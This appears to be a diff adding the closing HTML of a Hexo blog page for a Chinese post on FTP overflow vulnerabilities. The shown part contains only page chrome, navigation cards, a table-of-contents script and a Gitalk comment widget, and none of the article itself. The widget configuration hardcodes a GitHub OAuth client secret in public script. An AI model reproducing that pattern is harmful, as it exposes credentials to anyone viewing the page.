+            <span xmlns:dct="http://purl.org/dc/terms/" href="http://purl.org/dc/dcmitype/Text"
+                  property="dct:title" rel="dct:type">
+                    《FTP溢出漏洞分析》
+                </span> 由
+            <a xmlns:cc="http://creativecommons.org/ns#" href="/2019/11/26/ftp/" property="cc:attributionName"
+               rel="cc:attributionURL">
+                fightingtree
+            </a> 采用
+            <a rel="license noopener" href="https://creativecommons.org/licenses/by/4.0/deed.zh" target="_blank">
+                知识共享署名 4.0 国际许可协议
+            </a>进行许可。
+        
+    </div>
+
+    <script async defer>
+      document.addEventListener("copy", function (e) {
+        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
+        M.toast({html: toastHTML})
+      });
+
+      function navToReprintStatement() {
+        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
+      }
+    </script>
+
+
+        </div>
+    </div>
+
+    
+        <link rel="stylesheet" href="/libs/gitalk/gitalk.css">
+<link rel="stylesheet" href="/css/my-gitalk.css">
+
+<div class="card gitalk-card" data-aos="fade-up">
+    <div id="gitalk-container" class="card-content"></div>
+</div>
+
+<script src="/libs/gitalk/gitalk.min.js"></script>
+<script>
+    let gitalk = new Gitalk({
+        clientID: 'debc6373e622b493f954',
+        clientSecret: '5001da2e70b343177a3d07015d4478fd170b7037',
+        repo: 'fightingtree.github.io',
+        owner: 'fightingtree',
+        admin: "fightingtree",
+        id: '2019-11-26T13-11-44',
+        distractionFreeMode: false  // Facebook-like distraction free mode
+    });
+
+    gitalk.render('gitalk-container');
+</script>
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+<article id="prenext-posts" class="prev-next articles">
+    <div class="row article-row">
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge left-badge text-color">
+                <i class="fa fa-chevron-left"></i>&nbsp;上一篇</div>
+            <div class="card">
+                <a href="/2019/12/01/pki1/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="https://pic.superbed.cn/item/5db3fa668b58bc7bf71e525b.jpg" class="responsive-img" alt="PKI">
+                        
+                        <span class="card-title">PKI</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            公钥基础设施
+                        
+                    </div>
+                    <div class="publish-info">
+                        <span class="publish-date">
+                            <i class="fa fa-clock-o fa-fw icon-date"></i>2019-12-01
+                        </span>
+                        <span class="publish-author">
+                            
+                            <i class="fa fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/%E5%AE%89%E5%85%A8/" class="post-category" target="_blank">
+                                    安全
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/%E5%AE%89%E5%85%A8/" target="_blank">
+                        <span class="chip bg-color">安全</span>
+                    </a>
+                    
+                    <a href="/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/" target="_blank">
+                        <span class="chip bg-color">计算机网络</span>
+                    </a>
+                    
+                    <a href="/tags/PKI/" target="_blank">
+                        <span class="chip bg-color">PKI</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fa fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2019/11/24/penetrationtest5/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="https://pic.superbed.cn/item/5db3fa558b58bc7bf71e4c4f.jpg" class="responsive-img" alt="渗透测试知识点(5)">
+                        
+                        <span class="card-title">渗透测试知识点(5)</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            渗透攻击、社会工程学
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="fa fa-clock-o fa-fw icon-date"></i>2019-11-24
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fa fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/%E5%AE%89%E5%85%A8/" class="post-category" target="_blank">
+                                    安全
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/Web/" target="_blank">
+                        <span class="chip bg-color">Web</span>
+                    </a>
+                    
+                    <a href="/tags/%E5%AE%89%E5%85%A8/" target="_blank">
+                        <span class="chip bg-color">安全</span>
+                    </a>
+                    
+                    <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" target="_blank">
+                        <span class="chip bg-color">渗透测试</span>
+                    </a>
+                    
+                    <a href="/tags/Metasploit/" target="_blank">
+                        <span class="chip bg-color">Metasploit</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+    </div>
+</article>
+</div>
+
+
+<script>
+    $('#articleContent').on('copy', function (e) {
+        // IE8 or earlier browser is 'undefined'
+        if (typeof window.getSelection === 'undefined') return;
+
+        var selection = window.getSelection();
+        // if the selection is short let's not annoy our users.
+        if (('' + selection).length < Number.parseInt('120')) {
+            return;
+        }
+
+        // create a div outside of the visible area and fill it with the selected text.
+        var bodyElement = document.getElementsByTagName('body')[0];
+        var newdiv = document.createElement('div');
+        newdiv.style.position = 'absolute';
+        newdiv.style.left = '-99999px';
+        bodyElement.appendChild(newdiv);
+        newdiv.appendChild(selection.getRangeAt(0).cloneContents());
+
+        // we need a <pre> tag workaround.
+        // otherwise the text inside "pre" loses all the line breaks!
+        if (selection.getRangeAt(0).commonAncestorContainer.nodeName === 'PRE') {
+            newdiv.innerHTML = "<pre>" + newdiv.innerHTML + "</pre>";
+        }
+
+        var url = document.location.href;
+        newdiv.innerHTML += '<br />'
+            + '来源: FightingTree<br />'
+            + '作者: fightingtree<br />'
+            + '链接: <a href="' + url + '">' + url + '</a><br />'
+            + '本文章著作权归作者所有，任何形式的转载都请注明出处。';
+
+        selection.selectAllChildren(newdiv);
+        window.setTimeout(function () {bodyElement.removeChild(newdiv);}, 200);
+    });
+</script>
+
+
+    </div>
+    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
+        <div class="toc-widget">
+            <div class="toc-title"><i class="fa fa-list-alt"></i>&nbsp;&nbsp;目录</div>
+            <div id="toc-content"></div>
+        </div>
+    </div>
+</div>
+
+<!-- TOC 悬浮按钮. -->
+
+<div id="floating-toc-btn" class="hide-on-med-and-down">
+    <a class="btn-floating btn-large bg-color">
+        <i class="fa fa-list"></i>
+    </a>
+</div>
+
+
+<script src="/libs/tocbot/tocbot.min.js"></script>
+<script>
+    $(function () {
+        tocbot.init({
+            tocSelector: '#toc-content',
+            contentSelector: '#articleContent',
+            headingsOffset: -($(window).height() * 0.4 - 45),
+            // headingsOffset: -205,
+            headingSelector: 'h2, h3, h4'
+        });
+
+        // modify the toc link href to support Chinese.
+        let i = 0;
+        let tocHeading = 'toc-heading-';
+        $('#toc-content a').each(function () {
+            $(this).attr('href', '#' + tocHeading + (++i));
+        });
+
+        // modify the heading title id to support Chinese.
+        i = 0;
+        $('#articleContent').children('h2, h3, h4').each(function () {
+            $(this).attr('id', tocHeading + (++i));
+        });
+
+        // Set scroll toc fixed.
+        let tocHeight = parseInt($(window).height() * 0.4 - 64);
+        let $tocWidget = $('.toc-widget');
+        $(window).scroll(function () {
+            let scroll = $(window).scrollTop();
+            /* add post toc fixed. */
+            if (scroll > tocHeight) {
+                $tocWidget.addClass('toc-fixed');
+            } else {
+                $tocWidget.removeClass('toc-fixed');
+            }
+        });
+
+        
+        /* 修复文章卡片 div 的宽度. */
+        let fixPostCardWidth = function (srcId, targetId) {
+            let srcDiv = $('#' + srcId);
+            if (srcDiv.length === 0) {
+                return;
+            }
+
+            let w = srcDiv.width();
+            if (w >= 450) {
+                w = w + 21;
+            } else if (w >= 350 && w < 450) {
+                w = w + 18;
+            } else if (w >= 300 && w < 350) {
+                w = w + 16;
+            } else {
+                w = w + 14;
+            }
+            $('#' + targetId).width(w);
+        };
+
+        // 切换TOC目录展开收缩的相关操作.
+        const expandedClass = 'expanded';
+        let $tocAside = $('#toc-aside');
+        let $mainContent = $('#main-content');
+        $('#floating-toc-btn .btn-floating').click(function () {
+            if ($tocAside.hasClass(expandedClass)) {
+                $tocAside.removeClass(expandedClass).slideUp(500);
+                $mainContent.removeClass('l9');
+            } else {
+                $tocAside.addClass(expandedClass).slideDown(500);
+                $mainContent.addClass('l9');
+            }
+            fixPostCardWidth('artDetail', 'prenext-posts');
+        });
+        
+    });
+</script>
+    
+
+</main>
+
+
+<footer class="page-footer bg-color">
+    <div class="container row left-align">
+        <div class="col s12 m8 l8 copy-right">
+            本站由&copy;<a href="https://fightingtree.github.io/" target="_blank">fightingtree</a>基于
+            <a href="https://hexo.io/" target="_blank">Hexo</a> 的
+            <a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">hexo-theme-matery</a>主题搭建.
+            </div>
+
+         <div class="col s12 m8 l8 copy-right">
+            
+                &nbsp;<i class="fa fa-area-chart"></i>&nbsp;
+            站点总字数:&nbsp;
+                <span class="white-color">234.8k</span>
+            
+            </div>
+        <div class="col s12 m8 l8 copy-right">
+            
+			
+                <br>
+                
+                <span id="busuanzi_container_site_pv">
+                    <i class="fa fa-heart-o"></i>
+            本站总访问量 <span id="busuanzi_value_site_pv" class="white-color"></span>
+                </span>
+                
+                
+                <span id="busuanzi_container_site_uv">
+                    <i class="fa fa-users"></i>
+                    次,&nbsp;
+            访客数 <span id="busuanzi_value_site_uv" class="white-color"></span> 人.
+                </span>
+                
+            
+        </div>
+        <div class="col s12 m4 l4 social-link social-statis">
+
+
+    <a href="mailto:" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
+        <i class="fa fa-envelope-open"></i>
+    </a>
+
+
+
+    <a href="https://weibo.com/u/6112857421?from=myfollow_all" class="tooltipped" target="_blank" data-tooltip="访问我的微博" data-position="top" data-delay="50">
+        <i class="fa fa-weibo"></i>
+    </a>
+
+
+
+
+</div>
+    </div>
+</footer>
+
+<div class="progress-bar"></div>
+
+
+<!-- 搜索遮罩框 -->
+<div id="searchModal" class="modal">
+    <div class="modal-content">
+        <div class="search-header">
+            <span class="title"><i class="fa fa-search"></i>&nbsp;&nbsp;搜索</span>
+            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
+                   class="search-input">
+        </div>
+        <div id="searchResult"></div>
+    </div>
+</div>
+
+<script src="/js/search.js"></script>
+<script type="text/javascript">
+$(function () {
+    searchFunc("/" + "search.xml", 'searchInput', 'searchResult');
+});
+</script>
+<!-- 回到顶部按钮 -->
+<div id="backTop" class="top-scroll">
+    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
+        <i class="fa fa-angle-up"></i>
+    </a>
+</div>
+
+
+<script src="/libs/materialize/materialize.min.js"></script>
+<script src="/libs/masonry/masonry.pkgd.min.js"></script>
+<script src="/libs/aos/aos.js"></script>
+<script src="/libs/scrollprogress/scrollProgress.min.js"></script>
+<script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
+<script src="/js/matery.js"></script>
+
+
+<!-- Global site tag (gtag.js) - Google Analytics -->
+
+<script async src="https://www.googletagmanager.com/gtag/js?id="></script>
+<script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag() {
+        dataLayer.push(arguments);
+    }
+
+    gtag('js', new Date());
+    gtag('config', '');
+</script>
+
+
+
+    <script src="/libs/others/clicklove.js"></script>
+
+
+
+
+
+    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
+
+
+</body>
+</html>
